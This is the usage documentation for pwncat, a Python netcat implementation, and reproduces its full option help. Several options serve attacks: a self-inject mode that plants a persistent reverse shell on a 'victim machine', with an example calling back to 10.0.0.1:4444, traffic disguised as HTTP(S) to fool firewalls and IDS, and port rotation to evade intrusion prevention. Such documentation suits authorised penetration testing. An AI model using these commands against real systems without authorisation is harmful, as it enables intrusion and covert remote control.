*****
Usage
*****


.. |img_lnk_logo_github| raw:: html

   <a title="pwncat GitHub" target="_blank" href="https://github.com/cytopia/pwncat">
     <img src="https://raw.githubusercontent.com/cytopia/icons/master/64x64/github.png" />
   </a>

.. list-table::
   :widths: 25
   :header-rows: 1
   :class: install

   * - GitHub
   * - |img_lnk_logo_github|
   * - `cytopia/pwncat <https://github.com/cytopia/pwncat>`_


.. code-block:: console

   usage: pwncat [options] hostname port
          pwncat [options] -l [hostname] port
          pwncat [options] -z hostname port
          pwncat [options] -L [addr:]port hostname port
          pwncat [options] -R addr:port hostname port
          pwncat -V, --version
          pwncat -h, --help


   Enhanced and compatible Netcat implementation written in Python (2 and 3) with
   connect, zero-i/o, listen and forward modes and techniques to detect and evade
   firewalls and intrusion detection/prevention systems.

   If no mode arguments are specified, pwncat will run in connect mode and act as
   a client to connect to a remote endpoint. If the connection to the remote
   endoint is lost, pwncat will quit. See options for how to automatically re-
   connect.

   positional arguments:
     hostname              Address to listen, forward, scan or connect to.

     port                  [All modes]
                           Single port to listen, forward or connect to.
                           [Zero-I/O mode]
                           Specify multiple ports to scan:
                           Via list:  4444,4445,4446
                           Via range: 4444-4446
                           Via incr:  4444+2

   mode arguments:
     -l, --listen          [Listen mode]:
                           Start a server and listen for incoming connections.
                           If using TCP and a connected client disconnects or the
                           connection is interrupted otherwise, the server will
                           quit. See -k/--keep-open to change this behaviour.

     -z, --zero            [Zero-I/0 mode]:
                           Connect to a remote endpoint and report status only.
                           Used for port scanning.
                           See --banner for version detection.

     -L [addr:]port, --local [addr:]port
                           [Local forward mode]:
                           This mode will start a server and a client internally.
                           The internal server will listen locally on specified
                           addr/port (given by --local [addr:]port).
                           The server will then forward traffic to the internal
                           client which connects to another server specified by
                           hostname/port given via positional arguments.
                           (I.e.: proxies a remote service to a local address)

     -R addr:port, --remote addr:port
                           [Remote forward mode]:
                           This mode will start two clients internally. One is
                           connecting to the target and one is connecting to
                           another pwncat/netcat server you have started some-
                           where. Once connected, it will then proxy traffic
                           between you and the target.
                           This mode should be applied on machines that block
                           incoming traffic and only allow outbound.
                           The connection to your listening server is given by
                           -R/--remote addr:port and the connection to the
                           target machine via the positional arguments.

   optional arguments:
     -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.

     -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing
                           line endings for input and outout accordingly. Specify
                           'no' to completely remove any line feeds. By default
                           it will not replace anything and takes what is entered
                           (usually CRLF on Windows, LF on Linux and some times
                           CR on MacOS).

     -n, --nodns           Do not resolve DNS.

     --send-on-eof         Buffer data received on stdin until EOF and send
                           everything in one chunk.

     --no-shutdown         Do not shutdown into half-duplex mode.
                           If this option is passed, pwncat won`t invoke shutdown
                           on a socket after seeing EOF on stdin. This is provided
                           for backward-compatibility with OpenBSD netcat, which
                           exhibits this behavior.

     -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
                           or -vvvv for more verbosity. The server performance will
                           decrease drastically if you use more than three times.

     --info type           Show additional info about sockets, IPv4/6 or TCP opts
                           applied to the current socket connection. Valid
                           parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.
                           Note, you must at least be in INFO verbose mode in order
                           to see them (-vv).

     -c str, --color str   Colored log output. Specify 'always', 'never' or 'auto'.
                           In 'auto' mode, color is displayed as long as the output
                           goes to a terminal. If it is piped into a file, color
                           will automatically be disabled. This mode also disables
                           color on Windows by default. (default: auto)

     --safe-word str       All modes:
                           If pwncat is started with this argument, it will shut
                           down as soon as it receives the specified string. The
                           --keep-open (server) or --reconn (client) options will
                           be ignored and it won't listen again or reconnect to you.
                           Use a very unique string to not have it shut down
                           accidentally by other input.

   protocol arguments:
     -4                    Only Use IPv4 (default: IPv4 and IPv6 dualstack).

     -6                    Only Use IPv6 (default: IPv4 and IPv6 dualstack).

     -u, --udp             Use UDP for the connection instead of TCP.

     -T str, --tos str     Specifies IP Type of Service (ToS) for the connection.
                           Valid values are the tokens 'mincost', 'lowcost',
                           'reliability', 'throughput' or 'lowdelay'.

     --http                Connect / Listen mode (TCP and UDP):
                           Hide traffic in http packets to fool Firewalls/IDS/IPS.

     --https               Connect / Listen mode (TCP and UDP):
                           Hide traffic in https packets to fool Firewalls/IDS/IPS.

     -H [str [str ...]], --header [str [str ...]]
                           Add HTTP headers to your request when using --http(s).

   command & control arguments:
     --self-inject cmd:host:port[s]
                           Listen mode (TCP only):
                           If you are about to inject a reverse shell onto the
                           victim machine (via php, bash, nc, ncat or similar),
                           start your listening server with this argument.
                           This will then (as soon as the reverse shell connects)
                           automatically deploy and background-run an unbreakable
                           pwncat reverse shell onto the victim machine which then
                           also connects back to you with specified arguments.
                           Example: '--self-inject /bin/bash:10.0.0.1:4444'
                           It is also possible to launch multiple reverse shells by
                           specifying multiple ports.
                           Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
                           Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
                           Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
                           Note: this is currently an experimental feature and does
                           not work on Windows remote hosts yet.

   pwncat scripting engine:
     --script-send file    All modes (TCP and UDP):
                           A Python scripting engine to define your own custom
                           transformer function which will be executed before
                           sending data to a remote endpoint. Your file must
                           contain the exact following function which will:
                           be applied as the transformer:
                           def transform(data, pse):
                               # NOTE: the function name must be 'transform'
                               # NOTE: the function param name must be 'data'
                               # NOTE: indentation must be 4 spaces
                               # ... your transformations goes here
                               return data
                           You can also define as many custom functions or classes
                           within this file, but ensure to prefix them uniquely to
                           not collide with pwncat's function or classes, as the
                           file will be called with exec().

     --script-recv file    All modes (TCP and UDP):
                           A Python scripting engine to define your own custom
                           transformer function which will be executed after
                           receiving data from a remote endpoint. Your file must
                           contain the exact following function which will:
                           be applied as the transformer:
                           def transform(data, pse):
                               # NOTE: the function name must be 'transform'
                               # NOTE: the function param name must be 'data'
                               # NOTE: indentation must be 4 spaces
                               # ... your transformations goes here
                               return data
                           You can also define as many custom functions or classes
                           within this file, but ensure to prefix them uniquely to
                           not collide with pwncat's function or classes, as the
                           file will be called with exec().

   zero-i/o mode arguments:
     --banner              Zero-I/O (TCP and UDP):
                           Try banner grabbing during port scan.

   listen mode arguments:
     -k, --keep-open       Listen mode (TCP only):
                           Re-accept new clients in listen mode after a client has
                           disconnected or the connection is interrupted otherwise.
                           (default: server will quit after connection is gone)

     --rebind [x]          Listen mode (TCP and UDP):
                           If the server is unable to bind, it will re-initialize
                           itself x many times before giving up. Omit the
                           quantifier to rebind endlessly or specify a positive
                           integer for how many times to rebind before giving up.
                           See --rebind-robin for an interesting use-case.
                           (default: fail after first unsuccessful try).

     --rebind-wait s       Listen mode (TCP and UDP):
                           Wait x seconds between re-initialization. (default: 1)

     --rebind-robin port   Listen mode (TCP and UDP):
                           If the server is unable to initialize (e.g: cannot bind
                           and --rebind is specified, it it will shuffle ports in
                           round-robin mode to bind to.
                           Use comma separated string such as '80,81,82,83', a range
                           of ports '80-83' or an increment '80+3'.
                           Set --rebind to at least the number of ports to probe +1
                           This option requires --rebind to be specified.

   connect mode arguments:
     --source-addr addr    Specify source bind IP address for connect mode.

     --source-port port    Specify source bind port for connect mode.

     --reconn [x]          Connect mode (TCP and UDP):
                           If the remote server is not reachable or the connection
                           is interrupted, the client will connect again x many
                           times before giving up. Omit the quantifier to retry
                           endlessly or specify a positive integer for how many
                           times to retry before giving up.
                           (default: quit if the remote is not available or the
                           connection was interrupted)
                           This might be handy for stable TCP reverse shells ;-)
                           Note on UDP:
                           By default UDP does not know if it is connected, so
                           it will stop at the first port and assume it has a
                           connection. Consider using --udp-sconnect with this
                           option to make UDP aware of a successful connection.

     --reconn-wait s       Connect mode (TCP and UDP):
                           Wait x seconds between re-connects. (default: 1)

     --reconn-robin port   Connect mode (TCP and UDP):
                           If the remote server is not reachable or the connection
                           is interrupted and --reconn is specified, the client
                           will shuffle ports in round-robin mode to connect to.
                           Use comma separated string such as '80,81,82,83', a range
                           of ports '80-83' or an increment '80+3'.
                           Set --reconn to at least the number of ports to probe +1
                           This helps reverse shell to evade intrusiona prevention
                           systems that will cut your connection and block the
                           outbound port.
                           This is also useful in Connect or Zero-I/O mode to
                           figure out what outbound ports are allowed.

     --ping-init           Connect mode (TCP and UDP):
                           UDP is a stateless protocol unlike TCP, so no hand-
                           shake communication takes place and the client just
                           sends data to a server without being "accepted" by
                           the server first.
                           This means a server waiting for an UDP client to
                           connect to, is unable to send any data to the client,
                           before the client hasn't send data first. The server
                           simply doesn't know the IP address before an initial
                           connect.
                           The --ping-init option instructs the client to send one
                           single initial ping packet to the server, so that it is
                           able to talk to the client.
                           This is a way to make a UDP reverse shell work.
                           See --ping-word for what char/string to send as initial
                           ping packet (default: '\0')

     --ping-intvl s        Connect mode (TCP and UDP):
                           Instruct the client to send ping intervalls every s sec.
                           This allows you to restart your UDP server and just wait
                           for the client to report back in. This might be handy
                           for stable UDP reverse shells ;-)
                           See --ping-word for what char/string to send as initial
                           ping packet (default: '\0')

     --ping-word str       Connect mode (TCP and UDP):
                           Change the default character '\0' to use for upd ping.
                           Single character or strings are supported.

     --ping-robin port     Connect mode (TCP and UDP):
                           Instruct the client to shuffle the specified ports in
                           round-robin mode for a remote server to ping.
                           This might be handy to scan outbound allowed ports.
                           Use comma separated string such as '80,81,82,83', a range
                           of ports '80-83' or an increment '80+3'.
                           Use --ping-intvl 0 to be faster.

     --udp-sconnect        Connect mode (UDP only):
                           Emulating stateful behaviour for UDP connect phase by
                           sending an initial packet to the server to validate if
                           it is actually connected.
                           By default, UDP will simply issue a connect and is not
                           aware if it is really connected or not.
                           The default connect packet to be send is '\0', you
                           can change this with --udp-sconnect-word.

     --udp-sconnect-word [str]
                           Connect mode (UDP only):
                           Change the the data to be send for UDP stateful connect
                           behaviour. Note you can also omit the string to send an
                           empty packet (EOF), but be aware that some servers such
                           as netcat will instantly quit upon receive of an EOF
                           packet.
                           The default is to send a null byte sting: '\0'.

   misc arguments:
     -h, --help            Show this help message and exit
     -V, --version         Show version information and exit
